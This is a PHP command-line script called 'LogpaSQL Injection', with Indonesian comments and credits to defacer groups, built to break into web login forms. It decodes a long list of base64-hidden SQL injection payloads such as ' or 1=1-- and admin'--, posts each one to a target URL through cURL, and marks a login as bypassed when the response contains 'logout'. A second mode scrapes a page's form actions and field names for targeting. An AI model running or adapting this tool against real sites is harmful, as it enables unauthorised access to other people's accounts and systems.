<?php
/*
@name     : LogpaSQL Injection
@author   : Shor7cut
@descript : Dengan tools ini kalian dapat melakukan bypass Login dengan cepat.
@create   : Sat, 11 Jun 2016 10:05 PM
@Link     : http://facebook.com/bug7sec
@Spesial  : Tuban Cyber Team , IndoXploit Coders Team & Indonesia Defacer Tersakiti 
@howto    : https://www.facebook.com/bug7sec/videos/1043910189037406/
*/
    error_reporting(0);
    function login($url,$username,$password,$belakang){
        echo "[+]------------- INFO -------------\r\n";
        echo "[-> URL  : ".$url."\r\n";
        echo "[-> Name : ".$username." / ".$password." \r\n[-> Start... Bypass login.\r\n";
        echo "[->\r\n";
        echo "[+]---------------------------------\r\n";
        $up = array('Jy0n' => 'Jy0n','JyAn' => 'JyAn','JyYn' => 'JyYn','J14n' => 'J14n','Jyon' => 'Jyon','JyBvciAnJy0n' => 'JyBvciAnJy0n','JyBvciAnJyAn' => 'JyBvciAnJyAn','JyBvciAnJyYn' => 'JyBvciAnJyYn','JyBvciAnJ14n' => 'JyBvciAnJ14n','JyBvciAnJyon' => 'JyBvciAnJyon','Ii0i' => 'Ii0i','IiAi' => 'IiAi','IiYi' => 'IiYi','Il4i' => 'Il4i','Iioi' => 'Iioi','IiBvciAiIi0i' => 'IiBvciAiIi0i','IiBvciAiIiAi' => 'IiBvciAiIiAi','IiBvciAiIiYi' => 'IiBvciAiIiYi','IiBvciAiIl4i' => 'IiBvciAiIl4i','IiBvciAiIioi' => 'IiBvciAiIioi','b3IgdHJ1ZS0t' => 'b3IgdHJ1ZS0t','IiBvciB0cnVlLS0=' => 'IiBvciB0cnVlLS0=', 'JyBvciB0cnVlLS0=' => 'JyBvciB0cnVlLS0=', 'Iikgb3IgdHJ1ZS0t' => 'Iikgb3IgdHJ1ZS0t', 'Jykgb3IgdHJ1ZS0t' => 'Jykgb3IgdHJ1ZS0t', 'JyBvciAneCc9J3g=' => 'JyBvciAneCc9J3g=', 'Jykgb3IgKCd4Jyk9KCd4' => 'Jykgb3IgKCd4Jyk9KCd4', 'JykpIG9yICgoJ3gnKSk9KCgneA==' => 'JykpIG9yICgoJ3gnKSk9KCgneA==', 'IiBvciAieCI9Ing=' => 'IiBvciAieCI9Ing=', 'Iikgb3IgKCJ4Iik9KCJ4' => 'Iikgb3IgKCJ4Iik9KCJ4', 'IikpIG9yICgoIngiKSk9KCgieA==' => 'IikpIG9yICgoIngiKSk9KCgieA==', 'MSdvcicxJz0nMQ==' => 'MSdvcicxJz0nMQ==', 'dG9t' => 'dG9t', 'dG9t' => '', 'MScgb3IgMT0xIC0tIC0=' => 'MScgb3IgMT0xIC0tIC0=', 'dG9t' => 'MScgb3IgMT0xIC0tIC0=','JyBvciAnMSc9JzE='    => 'JyBvciAnMSc9JzE=','JyBvciAneCc9J3g='    => 'JyBvciAneCc9J3g=','JyBvciAwPTAgLS0='    => 'JyBvciAwPTAgLS0=','IiBvciAwPTAgLS0='    => 'IiBvciAwPTAgLS0=','b3IgMD0wIC0t'        => 'b3IgMD0wIC0t','JyBvciAwPTAgIw=='    => 'JyBvciAwPTAgIw==','IiBvciAwPTAgIw=='    => 'IiBvciAwPTAgIw==','b3IgMD0wICM='        => 'b3IgMD0wICM=',  'IiBvciAieCI9Ing='  => 'IiBvciAieCI9Ing=','Jykgb3IgKCd4Jz0neA==' => 'Jykgb3IgKCd4Jz0neA==','JyBvciAxPTEtLQ==' => 'JyBvciAxPTEtLQ==' ,'IiBvciAxPTEtLQ==' => 'IiBvciAxPTEtLQ==','b3IgMT0xLS0='        => 'b3IgMT0xLS0=','IiBvciAiYSI9ImE='    => 'IiBvciAiYSI9ImE=','Jykgb3IgKCdhJz0nYQ==' => 'Jykgb3IgKCdhJz0nYQ==','Iikgb3IgKCJhIj0iYQ==' => 'Iikgb3IgKCJhIj0iYQ==','aGkiIG9yICJhIj0iYQ==' => 'aGkiIG9yICJhIj0iYQ==','aGkiIG9yIDE9MSAtLQ==' => 'aGkiIG9yIDE9MSAtLQ==','aGknIG9yIDE9MSAtLQ==' => 'aGknIG9yIDE9MSAtLQ==','J29yJzE9MSc=' => 'J29yJzE9MSc=','PT0=' => 'PT0=','YW5kIDE9MS0t' => 'YW5kIDE9MS0t' ,'YW5kIDE9MQ==' => 'YW5kIDE9MQ==','JyBvciAnb25lJz0nb25lLS0=' => 'JyBvciAnb25lJz0nb25lLS0=','JyBvciAnb25lJz0nb25l'         => 'JyBvciAnb25lJz0nb25l','JyBhbmQgJ29uZSc9J29uZQ==' => 'JyBhbmQgJ29uZSc9J29uZQ==','JyBhbmQgJ29uZSc9J29uZS0t' => 'JyBhbmQgJ29uZSc9J29uZS0t','MScpIGFuZCAnMSc9JzEtLQ==' => 'MScpIGFuZCAnMSc9JzEtLQ==','YWRtaW4nIC0t' => 'YWRtaW4nIC0t','YWRtaW4nICM=' => 'YWRtaW4nICM=','YWRtaW4nLyo=' => 'YWRtaW4nLyo=','b3IgMT0xLS0=' => 'b3IgMT0xLS0=','b3IgMT0xIw==' => 'b3IgMT0xIw==','b3IgMT0xLyo=' => 'b3IgMT0xLyo=','KSBvciAnMSc9JzEtLQ==' => 'KSBvciAnMSc9JzEtLQ==','KSBvciAoJzEnPScxLS0=' => 'KSBvciAoJzEnPScxLS0=','JyBvciAnMSc9JzE=' => 'JyBvciAnMSc9JzE=','JyBvciAneCc9J3g=' => 'JyBvciAneCc9J3g=','JyBvciAwPTAgLS0=' => 'JyBvciAwPTAgLS0=','IiBvciAwPTAgLS0=' => 'IiBvciAwPTAgLS0=','b3IgMD0wIC0t' => 'b3IgMD0wIC0t','JyBvciAwPTAgIw==' => 'JyBvciAwPTAgIw==','IiBvciAwPTAgIw==' => 'IiBvciAwPTAgIw==','b3IgMD0wICM=' => 'b3IgMD0wICM=','JyBvciAneCc9J3g=' => 'JyBvciAneCc9J3g=','IiBvciAieCI9Ing=' => 'IiBvciAieCI9Ing=','Jykgb3IgKCd4Jz0neA==' => 'Jykgb3IgKCd4Jz0neA==','JyBvciAxPTEtLQ==' => 'JyBvciAxPTEtLQ==','IiBvciAxPTEtLQ==' => 'IiBvciAxPTEtLQ==','b3IgMT0xLS0=' => 'b3IgMT0xLS0=','JyBvciBhPWEtLQ==' => 'JyBvciBhPWEtLQ==','IiBvciAiYSI9ImE=' => 'IiBvciAiYSI9ImE=','Jykgb3IgKCdhJz0nYQ==' => 'Jykgb3IgKCdhJz0nYQ==','Iikgb3IgKCJhIj0iYQ==' => 'Iikgb3IgKCJhIj0iYQ==','aGkiIG9yICJhIj0iYQ==' => 'aGkiIG9yICJhIj0iYQ==','aGkiIG9yIDE9MSAtLQ==' => 'aGkiIG9yIDE9MSAtLQ==','aGknIG9yIDE9MSAtLQ==' => 'aGknIG9yIDE9MSAtLQ==');
        foreach ($up as $key => $ve) {
            $ch  = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3");
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT ,0);
            curl_setopt($ch, CURLOPT_TIMEOUT, 60);
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_VERBOSE, false);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $username."=".base64_decode($key)."&".$password."=".base64_decode($up[$key]).$belakang);
            $result = curl_exec($ch);
                //echo "[*] URL Login : ?".$username."=".base64_decode($key)."&".$password."=".base64_decode($up[$key]).$belakang"\r\n";
            if(sensiv($result)){
                echo "[+] Username : ".base64_decode($key)."\r\n[+] Password : ".base64_decode($up[$key])."\r\n\n";
            }else{
                echo "[-] Username : ".base64_decode($key)."\r\n[-] Password : ".base64_decode($up[$key])."\r\n\n";
            }
        }
    }

    function sensiv($data){
        $true=0;
        $datas = array('logout','Logout','keluar','exit'
        );
        foreach ($datas as $key) {$re = "/".$key."/"; preg_match_all($re, $data, $matches);if($matches[0][0]){    $true++;}
        }
        if(!$true<=0){return true;
        }else{return false;
        }
    }
    function arguments($argv) {
        $_ARG = array();
        foreach ($argv as $arg) {
          if (ereg('--([^=]+)=(.*)',$arg,$reg)) {$_ARG[$reg[1]] = $reg[2];
          } elseif(ereg('-([a-zA-Z0-9])',$arg,$reg)) {    $_ARG[$reg[1]] = 'true';}
       
        }
      return $_ARG;
    }

    function action($url){
        $str = file_get_contents($url); 
        $re     = "/action=\"(.*?)\"/"; preg_match_all($re, $str, $matches);
        $name   = "/name=\"(.*?)\"/i";  preg_match_all($name, $str, $matchesName);
        
        echo "\r\n\n/* --------- [ RESULT ] --------- \*\r\n";
        foreach ($matches[1] as $key => $urls) {
            echo "[URL] ".$urls."\r\n";
        }
        foreach ($matchesName[1] as $key => $names) {
            echo "[Name] ".$names."\r\n";
        }
    }

    $cuk = arguments($argv);
    if($cuk['l']){
        if(isset($cuk['url']) && $cuk['name']){
            list($user, $pass , $belakang) = explode(",", $cuk['name']);
            login($cuk['url'],$user,$pass,$belakang);
        }       
    }else if($cuk['n']){
        action($cuk['url']);
    }else if($cuk['h']){
        echo "\r\n\n/> php ".$argv[0]." -n --url=http://localhost/login.php\r\n";
        echo '/> php '.$argv[0].' -l --url=http://localhost/login.php --name="username","password" '."\r\n";
        echo '/> php '.$argv[0].' -l --url=http://localhost/login.php --name="username","password","&name=... (Optimal)"  '."\r\n";
    }else{
    echo "\r\n\n";
    echo "                ,--.!,  LogpaSQL Injection\r\n";
    echo "             __/   -*-  v.1b01\r\n";
    echo "           ,d08b.  '|`  \r\n";
    echo "           0088MM       -h (for help)    \r\n";
    echo "           `9MMP'       \r\n";
    echo "                        \r\n";
}

?>
